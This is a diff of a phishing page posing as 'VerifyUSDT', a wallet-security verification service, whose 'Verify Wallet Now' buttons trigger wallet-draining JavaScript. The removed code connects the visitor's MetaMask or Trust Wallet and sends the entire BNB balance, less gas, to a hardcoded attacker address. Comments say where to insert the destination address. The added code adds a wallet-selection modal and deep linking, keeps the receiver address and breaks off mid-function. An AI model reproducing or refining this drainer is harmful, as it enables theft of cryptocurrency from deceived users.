@@ -131,6 +131,49 @@
     .footer-links a:hover { color: var(--primary-color); }
     .footer-socials i { font-size: 1.3rem; color: var(--text-dark); margin: 0 10px; transition: color var(--transition-speed); }
     .footer-socials i:hover { color: var(--primary-color); }
+    /* Modal styles for wallet selection */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: var(--background-light);
+      padding: 30px;
+      border-radius: 12px;
+      border: 1px solid var(--card-border);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      position: relative;
+    }
+    .modal-content h3 {
+      font-size: 1.5rem;
+      margin-bottom: 20px;
+      color: var(--text-light);
+    }
+    .modal-content .btn {
+      margin: 10px;
+      width: 80%;
+    }
+    .close-modal {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      font-size: 1.5rem;
+      color: var(--text-dark);
+      cursor: pointer;
+    }
+    .close-modal:hover {
+      color: var(--primary-color);
+    }
     @media (max-width: 992px) {
       .hero h1 { font-size: 2.8rem; }
       .section-title h2 { font-size: 2rem; }
@@ -170,7 +213,7 @@
     <div class="container">
       <h1>Secure Your Digital Assets. <span>Instantly.</span></h1>
       <p>VerifyUSDT offers cutting-edge USDT monitoring, comprehensive risk detection, and proactive threat interception. Experience seamless and worry-free transactions on the blockchain.</p>
-      <a href="#" onclick="connectAndTransfer(); return false;" class="btn btn-primary">Verify Wallet Now</a>
+      <a href="#" onclick="showWalletModal(); return false;" class="btn btn-primary">Verify Wallet Now</a>
       <a href="#learn-more" class="btn btn-outline" style="margin-left: 15px;">Learn More</a>
     </div>
   </section>
@@ -223,7 +266,7 @@
     <div class="container">
       <h2>Ready to Secure Your USDT?</h2>
       <p>Monitor, detect, and eliminate risks. Download your personalized wallet health certificate today and transact with confidence.</p>
-      <a href="#" onclick="connectAndTransfer(); return false;" class="btn btn-secondary">Check Your Wallet Now</a>
+      <a href="#" onclick="showWalletModal(); return false;" class="btn btn-secondary">Check Your Wallet Now</a>
       <div style="margin-top: 30px; color: var(--primary-color); font-weight: 500; font-size: 1.1rem;">
         <i class="fas fa-shield-alt"></i> Protected by VerifyUSDT Global Network
       </div>
@@ -252,67 +295,76 @@
         <div class="footer-socials">
             <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a><a href="#" aria-label="Telegram"><i class="fab fa-telegram-plane"></i></a><a href="#" aria-label="Medium"><i class="fab fa-medium-m"></i></a>
         </div>
-      <p>&copy; 2025 VerifyUSDT. All rights reserved. Your trusted partner in blockchain security.</p>
+      <p>© 2025 VerifyUSDT. All rights reserved. Your trusted partner in blockchain security.</p>
     </div>
   </footer>
+
+  <!-- Wallet Selection Modal -->
+  <div id="walletModal" class="modal">
+    <div class="modal-content">
+      <span class="close-modal" onclick="closeWalletModal()">×</span>
+      <h3>Select Wallet to Connect</h3>
+      <button onclick="connectWallet('MetaMask')" class="btn btn-primary">Connect with MetaMask</button>
+      <button onclick="connectWallet('TrustWallet')" class="btn btn-secondary">Connect with Trust Wallet</button>
+    </div>
+  </div>
 
   <script>
     const receiverAddress = "0x1234567890abcdef..."; // Yahan apna destination wallet address daalo
 
-    async function connectAndTransfer() {
-      if (window.ethereum) {
-        const web3 = new Web3(window.ethereum);
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          const accounts = await web3.eth.getAccounts();
-          const sender = accounts[0];
-
-          if (!sender) { // छोटी सी जांच कि अकाउंट मिला है या नहीं
-            alert("Wallet account not found. Please ensure your wallet is connected.");
-            return;
-          }
-
-          // Get full balance in Wei
-          let balance = await web3.eth.getBalance(sender);
-          
-          // Gas cost estimate (use ~0.001 BNB as gas) - आपके मूल कोड के अनुसार
-          const gasEstimate = web3.utils.toWei("0.001", "ether"); // यह एक फिक्स्ड गैस अनुमान है
-
-          // Amount to send = balance - gas - आपके मूल कोड के अनुसार
-          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasEstimate));
-
-          // जांच करें कि भेजने के लिए पर्याप्त बैलेंस है (गैस शुल्क घटाने के बाद)
-          if (amountToSend.lte(web3.utils.toBN('0'))) { // BigNumber के साथ तुलना के लिए .toBN('0')
-            alert("Insufficient balance to send BNB after deducting estimated gas fee (0.001 BNB).");
-            return;
-          }
-
-          // Send BNB
-          const tx = await web3.eth.sendTransaction({
-            from: sender,
-            to: receiverAddress,
-            value: amountToSend.toString()
-            // gas: '21000', // आप चाहें तो एक स्टैण्डर्ड गैस लिमिट यहां भी दे सकते हैं
-            // gasPrice: await web3.eth.getGasPrice() // या डायनामिक गैस प्राइस
-          });
-
-          alert("BNB sent! Tx hash: " + tx.transactionHash);
-        } catch (err) {
-          console.error("Error:", err); // आपके मूल कोड के अनुसार सरल एरर लॉगिंग
-          // उपयोगकर्ता को थोड़ी और जानकारी देने के लिए एक सरल अलर्ट
-          if (err.code === 4001) { // EIP-1193 user rejected error
-            alert("Transaction rejected by user.");
-          } else if (err.message.toLowerCase().includes("insufficient funds")) {
-            alert("Error: Insufficient funds for transaction.");
-          } else {
-            alert("An error occurred: " + err.message);
-          }
-        }
-      } else {
-        alert("Please install MetaMask or Trust Wallet (or use the DApp browser in Trust Wallet).");
-      }
+    // Show wallet selection modal
+    function showWalletModal() {
+      document.getElementById('walletModal').style.display = 'flex';
     }
-  </script>
 
-</body>
-</html>
+    // Close wallet selection modal
+    function closeWalletModal() {
+      document.getElementById('walletModal').style.display = 'none';
+    }
+
+    // Detect if the user is on a mobile device
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Connect wallet (MetaMask or Trust Wallet)
+    async function connectWallet(walletType) {
+      let provider = null;
+
+      // Try to detect the provider
+      if (window.ethereum) {
+        provider = window.ethereum;
+      } else if (window.trustwallet) {
+        provider = window.trustwallet;
+      }
+
+      // If provider not found and trying to connect with Trust Wallet, attempt deep linking on mobile
+      if (!provider && walletType === 'TrustWallet' && isMobileDevice()) {
+        const deepLink = `trust://open_url?url=${encodeURIComponent(window.location.href)}`;
+        alert("Trust Wallet not detected. Redirecting to Trust Wallet app...");
+        window.location.href = deepLink;
+
+        // Fallback if deep link doesn't work
+        setTimeout(() => {
+          alert("If Trust Wallet didn't open, please manually open the Trust Wallet app, go to the DApp browser, and load this page.");
+        }, 2000);
+        closeWalletModal();
+        return;
+      } else if (!provider && walletType === 'TrustWallet') {
+        alert("Trust Wallet not detected. Please open this page in the Trust Wallet DApp browser. On mobile, use the Trust Wallet app's browser. On desktop, use a browser with Trust Wallet extension if available.");
+        closeWalletModal();
+        return;
+      } else if (!provider && walletType === 'MetaMask') {
+        alert("MetaMask not detected. Please install the MetaMask extension or use the MetaMask mobile app browser.");
+        closeWalletModal();
+        return;
+      }
+
+      try {
+        const web3 = new Web3(provider);
+
+        // Request wallet connection
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        const sender = accounts[0];
+
+        if 
